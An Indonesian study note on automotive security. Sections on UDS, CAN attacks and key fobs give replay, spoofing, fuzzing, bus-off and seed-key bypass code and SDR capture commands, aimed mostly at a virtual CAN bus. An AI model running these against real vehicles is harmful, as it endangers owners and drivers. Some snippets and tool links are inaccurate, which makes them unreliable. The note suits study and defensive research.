---
title: Automotive Security — CAN Bus, ECU & Vehicle Hacking
tags:
  - automotive
  - can-bus
  - ecu
  - obd-ii
  - vehicle-hacking
  - automotive-security
  - iso-21434
created: "2026-07-19"
updated: "2026-07-19"
status: growing
---

> [!abstract] Ringkasan & Hubungan ke Vault
> Mobil modern bukan lagi sekedar mesin mekanik — mobil adalah **jaringan embedded systems** dengan 100+ ECU, CAN bus sebagai backbone, dan attack surface yang meluas dari telematics 4G sampe keyless entry SDR. Catatan ini natural extension dari [[hardware-hacking-re]] (embedded) dan [[wireless-security-deepdive]] (RF untuk key fob), serta jembatan ke [[exploit-development]] dan [[ics-scada-security]] (safety-critical systems).
>
> **Domain:** Cyber Security / Automotive
> **Tags:** #automotive #can-bus #ecu #obd-ii #vehicle-forensics

## Daftar Isi

1. [Fundamental CAN Bus](#1-fundamental-can-bus)
2. [OBD-II & Standard PIDs](#2-obd-ii--standard-pids)
3. [ECU Architecture & UDS](#3-ecu-architecture--uds)
4. [SocketCAN & Tooling](#4-socketcan--tooling)
5. [CAN Bus Attacks](#5-can-bus-attacks)
6. [Keyless Entry & Key Fob Attacks](#6-keyless-entry--key-fob-attacks)
7. [ADAS & Sensor Security](#7-adas--sensor-security)
8. [Telematics & Remote Attack Surface](#8-telematics--remote-attack-surface)
9. [Vehicle Forensics](#9-vehicle-forensics)
10. [ISO 21434 & Automotive Cybersecurity](#10-iso-21434--automotive-cybersecurity)
11. [Koneksi ke Vault](#11-koneksi-ke-vault)

## 1. Fundamental CAN Bus

### 1.1 CAN Bus Frame Format

CAN (Controller Area Network) — protokol bus serial yang ditemukan Bosch (1983), masih dominan sampai sekarang.

```
CAN 2.0A (Standard, 11-bit ID):
┌───┬────┬────┬────┬────┬────┬────┬────┬────┬───┐
│SOF│ ID │RTR│IDE│ r0│ DLC│ Data (0-8B)│CRC │ACK│
│ 1 │ 11 │ 1  │ 1 │ 1 │ 4  │ 0-64 bit   │ 15 │ 1 │
└───┴────┴────┴────┴────┴────┴────┴────┴────┴───┘

CAN 2.0B (Extended, 29-bit ID):
┌───┬──────┬──┬───┬──┬──┬──┬────┬────┬──┬───┐
│SOF│ 11b  │SRR│IDE│18b│RTR│r1│DLC │Data│CRC│ACK│
│ 1 │  ID  │ 1 │ 1 │ ID│ 1 │ 1 │ 4  │0-8B│15 │ 1 │
└───┴──────┴──┴───┴──┴──┴──┴────┴────┴──┴───┘
```

### 1.2 CAN Arbitration — Bagaimana Bus Decides Who Wins?

CAN menggunakan **CSMA/CR** (Carrier Sense Multiple Access / Collision Resolution). Dua ECU ngirim simultan? Yang punya **ID paling rendah (dominant)** menang.

```
ECU A mengirim ID = 0x100  (binary: 001 0000 0000)
ECU B mengirim ID = 0x200  (binary: 010 0000 0000)
                     ↑
Bit 1: A=0 (dominant), B=1 (recessive)
→ A menang, B otomatis stop → retry
```

**Konsekuensi keamanan:** ID rendah punya prioritas lebih tinggi. ID `0x000` bisa preempt ID `0x7FF`. Attacker bisa flood dengan ID `0x000` untuk **bus DoS** — semua ECU lain gak bisa ngirim.

### 1.3 CAN 2.0 vs CAN FD vs FlexRay

| Feature            | CAN 2.0                          | CAN FD                | FlexRay                  |
| ------------------ | -------------------------------- | --------------------- | ------------------------ |
| **Payload**        | 8 bytes                          | 64 bytes              | 254 bytes                |
| **Data Rate**      | 1 Mbps                           | 2-5 Mbps (data phase) | 10 Mbps                  |
| **Arbitration**    | CSMA/CR                          | CSMA/CR               | TDMA (time-triggered)    |
| **Topology**       | Bus                              | Bus                   | Star / Bus               |
| **Error Handling** | Error passive/bus-off            | Same                  | More robust              |
| **Security**       | None (plaintext)                 | None + CRC            | CRC only                 |
| **Used In**        | All cars (OBD, powertrain, body) | Newer cars (2020+)    | BMW, premium (X-by-wire) |

### 1.4 CAN Bus Topology

```
               120Ω ┌────────┐ 120Ω
┌─────[ECM]── ─── ─── ─── ─── ─── ───┐
│             │                       │
│         ┌───┤        ┌────────┐     │
│   ┌─────┤BCM├──── ───┤ABS/ESP├───  │
│   │     └───┘        └────────┘    │
┌───┴───┐      ┌────────┐    ┌──────┐│
│TCU/  │      │ IC/Cluster├───│Gateway││
│Telemat│      └────────┘    └──────┘│
└───────┘                         │
                     ┌──────────┐ │
                     │ OBD-II   ├─┘
                     │ Port     │
                     └──────────┘
```

**Critical insight:** Banyak mobil modern punya gateway antara powertrain CAN, body CAN, infotainment CAN. Tapi di banyak implementasi, gateway bisa di-bypass — sekali attacker dapat akses ke OBD, bisa kirim message ke CAN internal.

## 2. OBD-II & Standard PIDs

### 2.1 OBD-II Port Pinout (J1962)

```
┌────────────────────┐
│ 1: Vendor          │ 9: Vendor
│ 2: J1850 Bus+      │10: J1850 Bus-
│ 3: Vendor          │11: Vendor
│ 4: Chassis GND     │12: Vendor
│ 5: Signal GND      │13: Vendor
│ 6: CAN High (J2284)│14: CAN Low (J2284)
│ 7: ISO 9141 K-Line │15: ISO 9141 L-Line
│ 8: Vendor          │16: +12V Battery
└────────────────────┘
```

**CAN pins (6 & 14)** adalah yang paling penting — ini yang dipakai 99% mobil modern (2008+). Pin 6 = CAN-H (2.5V idle, 3.5V dominant), pin 14 = CAN-L (2.5V idle, 1.5V dominant).

### 2.2 Standard PIDs (OBD-II Mode 01)

```
PID  Request                 Response
00   List supported PIDs     Bitmask 32 PID
05   Engine coolant temp     ((A - 40) °C)
0C   Engine RPM              ((A*256+B)/4)
0D   Vehicle speed           A km/h
11   Throttle position       A * 100/255 %
1F   Run time since start    (A*256+B) seconds
...
```

```bash
# Request RPM via CAN
cansend can0 7DF#02010C0000000000
# Response: 7E8#03410C0FA000000000 → RPM = (0x0F * 256 + 0xA0) / 4 = 1000 rpm
```

### 2.3 OBD-II Security Issues

- ✅ **Read access** untuk most PIDs (standard)
- ❌ **Unrestricted CAN access** — semua device di OBD pin punya akses penuh ke bus
- ❌ **Diagnostic services** (ECU flashing, module reprogram) kadang gak dilindungi password
- ⚠️ **BLE/WiFi OBD dongles** — sering credential default, exposed ke LAN

## 3. ECU Architecture & UDS

### 3.1 ECU Network Classification

| Domain           | ECUs               | CAN Bus Speed | Criticality                             |
| ---------------- | ------------------ | ------------- | --------------------------------------- |
| **Powertrain**   | ECM, TCM, BMS      | 500 kbps      | **Safety-critical** (brake, throttle)   |
| **Chassis**      | ABS, ESP, EPS, SRS | 500 kbps      | **Safety-critical** (airbag, stability) |
| **Body**         | BCM, DCM, HVAC     | 125-250 kbps  | Comfort (windows, lights, door)         |
| **Infotainment** | HU, IC, AMP, DAB   | 125-500 kbps  | Non-safety (but gateway connected)      |
| **Telematics**   | TCU, V2X           | 125-500 kbps  | Communication (4G/5G)                   |

### 3.2 UDS (Unified Diagnostic Services) — ISO 14229

Protokol diagnostik standar untuk semua ECU modern:

| SID  | Service                    | Direction      | Security             |
| ---- | -------------------------- | -------------- | -------------------- |
| 0x10 | DiagnosticSessionControl   | Tester→ECU     | Ya (level 1-3)       |
| 0x11 | ECUReset                   | Tester→ECU     | Ya                   |
| 0x14 | ClearDiagnosticInformation | Tester→ECU     | Ya                   |
| 0x19 | ReadDTCInformation         | Bi-directional | Tidak                |
| 0x22 | ReadDataByIdentifier       | Tester→ECU     | Tidak (some)         |
| 0x27 | SecurityAccess             | Tester→ECU     | **Unlock seed-key**  |
| 0x28 | CommunicationControl       | Tester→ECU     | Ya                   |
| 0x2E | WriteDataByIdentifier      | Tester→ECU     | Ya                   |
| 0x31 | RoutineControl             | Tester→ECU     | Ya                   |
| 0x34 | RequestDownload            | Tester→ECU     | **Ya (reflash)**     |
| 0x35 | RequestUpload              | Tester→ECU     | Ya                   |
| 0x36 | TransferData               | Tester→ECU     | **Ya (write flash)** |
| 0x37 | RequestTransferExit        | Tester→ECU     | Ya                   |

**Critical:** SID 0x27 (SecurityAccess) adalah satu-satunya barrier antara "read-only" dan "ECU reflash". Seed-key algorithm sering lemah (static key, XOR-based, proprietary rolling).

```python
# UDS Session: masuk diagnostic session
uds_session = b'\x10\x03'  # Extended diagnostic session
# SecurityAccess: 0x27 + subfunction 01 (request seed)
seed_request = b'\x27\x01'
# Response: 0x67 0x01 [seed bytes]
# Compute key dari seed (inverse XOR typical)
key = bytes([~s & 0xFF for s in seed])
key_request = b'\x27\x02' + key  # Send key
```

## 4. SocketCAN & Tooling

### 4.1 Setup SocketCAN

```bash
# Enable CAN interface
sudo modprobe can
sudo modprobe can_raw
sudo modprobe vcan  # virtual CAN for testing

# Create virtual CAN interface (testing without real HW)
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Real CAN (via USB-CAN adapter like USBtin, PCAN, CANtact)
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0
```

### 4.2 Essential can-utils

```bash
# Sniff all CAN traffic (live)
candump vcan0

# Sniff with filter (exclude 0x7DF OBD broadcast)
candump vcan0 -x

# Send single CAN frame
cansend vcan0 123#DEADBEEF

# Send with extended ID (29-bit)
cansend vcan0 00000012#0102030405060708

# Monitor bus load
canbusload vcan0

# Get interface statistics
ip -det -stat link dev can0
```

### 4.3 Advanced Tooling

| Tool                                                 | Purpose                | Notes                    |
| ---------------------------------------------------- | ---------------------- | ------------------------ |
| [caringo](https://github.com/grnet/caringo)          | CAN bus ID bruteforce  | Find active IDs on bus   |
| [CANtact](https://cantact.io/)                       | USB-CAN adapter        | Open source hardware     |
| [UDSim](https://github.com/zombieCraig/UDSim)        | Simulated ECU          | Testing UDS commands     |
| [Kayak](https://github.com/dschanoeh/Kayak)          | Java CAN bus analyzer  | Like Wireshark for CAN   |
| [Busmaster](https://github.com/rbei-etas/busmaster)  | Full-featured tool     | Windows, commercial-like |
| [Python-can](https://github.com/hardbyte/python-can) | Python library         | Scripting interface      |
| [icsim](https://github.com/zombieCraig/icsim)        | Instrument cluster sim | Demo/test environment    |

## 5. CAN Bus Attacks

### 5.1 CAN Bus Attack Taxonomy

```
CAN Attack Surface
├── Sniffing (passive)
│   └── Record all traffic → map ID → data = awasi semua komunikasi
├── DoS
│   ├── Bus-off attack (error passive → bus-off)
│   ├── ID 0x000 flood (dominant preempt)
│   └── Bus overload (high frequency messages)
├── Fuzzing
│   └── Random ID + random data → detect unexpected response
├── Replay
│   └── Record legitimate frame → replay later (e.g., unlock door)
├── Spoofing
│   └── Inject frame with legitimate ID → ECU percaya dari source valid
├── Masquerade
│   ├── ECU isolation (error passive target ECU)
│   └── Send fake data → target ECU gak bisa defend
└── Malicious Diagnostic
    └── UDS: stop ECU, reflash firmware, modify configuration
```

### 5.2 Sniffing + Replay

```bash
# Step 1: Sniff traffic (1 menit record)
candump vcan0 -l  # saves candump-2026-07-19_*.log

# Step 2: Identify interesting frames (e.g., door lock = ID 0x240)
# Filter ID 0x240 dari log
grep " 0240 " candump-*.log

# Step 3: Replay frame
# Record door UNLOCK
cansend vcan0 240#0102030405060708
# Wait → door unlocks (confirmed)

# Step 4: Replay di lain waktu → door opens!
```

### 5.3 Fuzzing

```bash
#!/bin/bash
# CAN bus fuzzer — test all IDs with random data
for id in $(seq 0 2047); do
    hex_id=$(printf '%03x' $id)
    data=$(openssl rand -hex 8)
    cansend vcan0 ${hex_id}#${data}
    sleep 0.001
done
```

### 5.4 Bus-Off Attack

Setiap CAN controller punya **TEC** (Transmit Error Counter) dan **REC** (Receive Error Counter). Jika TEC > 255, ECU masuk **bus-off state** — gak bisa transmit atau receive.

```python
# Bus-off attack: force target ECU into error passive → bus off
# Kirim frame dengan deliberate CRC error di slot spesifik
import socket
import struct

s = socket.socket(socket.PF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
s.bind(('vcan0',))

# Kraken-style: kirim 10000+ frame dengan dominant error flag
# Setiap frame salah bikin TEC ECU target naik
# Setelah 256 error → bus-off
for i in range(10000):
    frame = struct.pack("<IB3x8s", 0x123, 0, b'\x00' * 8)
    s.send(frame)
```

### 5.5 Masquerade / Spoofing

```
Attack Scenario — Speedometer Manipulation
1. Identifikasi ID untuk speed dari sniffing: 0x1A0
2. Target ECU (IC/cluster) percaya ID 0x1A0 = speed sensor
3. Inject: cansend vcan0 1A0#01F4000000000000 = speed 500 km/h
4. Cluster display: 500 km/h. Warning alarm on.
5. Tapi kecepatan asli = 60 km/h. ECU yg baca speed asli gak terpengaruh
```

## 6. Keyless Entry & Key Fob Attacks

### 6.1 Rolling Codes

```
Fob → Car:  ID_Fob + Counter + Command + Auth
                      ↓
Car check: Counter > lastCounter? && Auth valid?
                      ↓
        Accept command && update lastCounter
```

**Rolling jam:** Setiap kali lo pencet tombol, counter naik. Tapi ada vulnerability di implementasi — beberapa mobil accept counter dalam window ±256 dari lastCounter.

### 6.2 Replay Attack (SDR-based)

```bash
# Capture key fob signal (315/433/868 MHz)
# Tool: rtl_433 + GQRX
rtl_433 -f 433920000 -s 250000 -g 40

# Record raw signal
hackrf_transfer -r keyfob.iq -f 315000000 -s 2000000 -n 10000000

# Analyze with Universal Radio Hacker (URH)
urh
```

**Modern key fobs resist replay** via rolling codes. Tapi **Relay attack** works:

### 6.3 Relay Attack

```
┌──────────┐          ┌──────────────┐         ┌──────────┐
│  Key Fob  │    RF    │  Attacker 1   │  WiFi   │ Attacker │
│ (rumah)   │────────→│ (near fob)     │────────→│ 2 (car)  │
└──────────┘          │ Amplified RF   │         │ ┌──────┐ │
                      │ relay signal   │         │ │ Car  │ │
                      └──────────────┘         │ └──────┘ │
                                               └──────────┘
```

**Tool:** [HackRF + Yard Stick One](https://github.com/0x90/killerbee) untuk relay.

## 7. ADAS & Sensor Security

### 7.1 Sensor Types & Attack Surface

| Sensor         | Function                            | Attack                                           |
| -------------- | ----------------------------------- | ------------------------------------------------ |
| **Camera**     | Lane keep, traffic sign, pedestrian | Blinding (laser), spoof sign (adversarial patch) |
| **LiDAR**      | Object detection, ranging           | Spoofing (delayed pulse), jamming (IR)           |
| **Radar**      | ACC, blind spot                     | Jamming (same freq), spoofing (chirp modulation) |
| **Ultrasonic** | Parking sensor                      | Jamming, spoofing (noise)                        |
| **GPS**        | Navigation                          | Spoofing (fake satellite signals), jamming       |

### 7.2 Adversarial Patch for Camera

Pernah lihat sticker STOP kecil yang bisa bikin Tesla autopilot berhenti? Itu **adversarial patch**:

```python
# Concept: generate patch that misclassifies STOP sign
# as 80 km/h speed limit
import torch
import torch.nn.functional as F

# Patch generation (simplified):
patch = torch.rand(3, 128, 128, requires_grad=True)
optimizer = torch.optim.Adam([patch], lr=0.01)

for epoch in range(1000):
    # Apply patch to STOP sign image
    adversarial_image = image + patch
    output = model(adversarial_image)
    # Target class: speed_limit_80
    loss = -F.cross_entropy(output, target_class)
    loss.backward()
    optimizer.step()
```

## 8. Telematics & Remote Attack Surface

### 8.1 Modern Attack Vector

```
Internet
   ↓ 4G/5G
Telematics Control Unit (TCU)
   ↓ CAN gateway
ECUs (powertrain, body, chassis)
```

**Remote attack path (Jeep Cherokee 2015 — Charlie Miller & Chris Valasek):**

1. Pwn infotainment via cellular
2. Flash new firmware via OTA update mechanism
3. CAN gateway bypass
4. Send CAN frames ke steering column ECU
5. **Kontrol setir, rem, transmission dari laptop di ruang tamu**

### 8.2 Telematics Attack Surface Checklist

```
TCU Attack Surface:
├── Cellular (4G/5G): SMS-based commands, data tunelling
├── WiFi hotspot: default credential, weak WPA2
├── Bluetooth: SDP record, SSRF via PBAP
├── OTA update: unsigned firmware, no integrity check
├── GPS: spoofing (fake NMEA sentences)
├── Voice assistant (Alexa/car native): command injection
└── App ecosystem: vulnerable API, leak authentication token
```

## 9. Vehicle Forensics

### 9.1 EDR (Event Data Recorder)

Mobil modern (US: mandatory 2014+) punya EDR yang merekam:

```python
# EDR data typical:
edr_data = {
    'speed': {
        'pre_5s': [...],      # Speed every 0.5s in last 5 seconds
        'max': 85,             # Max speed during event (mph)
    },
    'brake': {
        'on_before': True,     # Brake applied before crash?
        'pressure': [...],     # Brake pressure over time
    },
    'throttle': {
        'position': [...],     # Throttle %
    },
    'airbag': {
        'deployed': True,
        'time': 0.023,         # Seconds after trigger
    },
    'seatbelt': {
        'driver': True,
        'passenger': False,
    },
    'crash': {
        'delta_v': 45,         # Change in velocity (km/h)
        'longitudinal': -32.4,
        'lateral': 5.2,
    }
}
```

**Akses EDR:** CDR (Crash Data Retrieval) tool dari Bosch — butuh physical access ke airbag module.

### 9.2 Infotainment Forensics

```bash
# Extract GPS logs from HU (Head Unit)
# Android Auto / Apple CarPlay mirror data
# Bluetooth pairing history
# Connected phone contacts
# WiFi networks history
# Navigation history (destinations, routes)
# Voice command recordings
```

## 10. ISO 21434 & Automotive Cybersecurity

### 10.1 ISO 21434 — Road Vehicle Cybersecurity Engineering

Standar cybersecurity untuk otomotif, mirip ISA/IEC 62443 untuk ICS.

```
Concept Phase
├── Item definition (scope of what we're building)
├── Cybersecurity goals
├── TARA (Threat Analysis & Risk Assessment)
└── Cybersecurity concept
    ↓
Development Phase
├── Product development (secure coding, cryptographic
│    key management, secure boot, secure flash update)
├── Verification & validation
└── Pen testing
    ↓
Production Phase
├── Cybersecurity monitoring
├── Incident response
└── Software updates (OTA + integrity)
```

## 11. Koneksi ke Vault

| Note                               | Hubungan                                    |
| ---------------------------------- | ------------------------------------------- |
| [[hardware-hacking-re]]            | ECU hardware extraction, chip-off forensics |
| [[wireless-security-deepdive]]     | Key fob RF, BLE telematics, SDR             |
| [[exploit-development]]            | CAN fuzzing → exploit chain ke ECU          |
| [[ics-scada-security]]             | Safety-critical system security methodology |
| [[fuzzing-vulnerability-research]] | CAN fuzzing, protocol fuzzing               |
| [[embedded-systems]]               | ECU RTOS, CAN stack implementation          |
| [[military-sigint-deepdive]]       | RF direction finding untuk telematics SDR   |
| [[forensic-imaging-analysis]]      | Vehicle forensics imaging                   |

---

### 📚 Referensi

1. "The Car Hacker's Handbook" — Craig Smith
2. Miller & Valasek — Remote Exploitation of an Unaltered Passenger Vehicle (Black Hat 2015)
3. ISO 21434:2021 — Road Vehicles — Cybersecurity Engineering
4. OpenGarages: [https://opengarages.org/](https://opengarages.org/)
5. CAN bus specification: Bosch CAN 2.0
6. carshark / ICSim: [https://github.com/zombieCraig/icsim](https://github.com/zombieCraig/icsim)
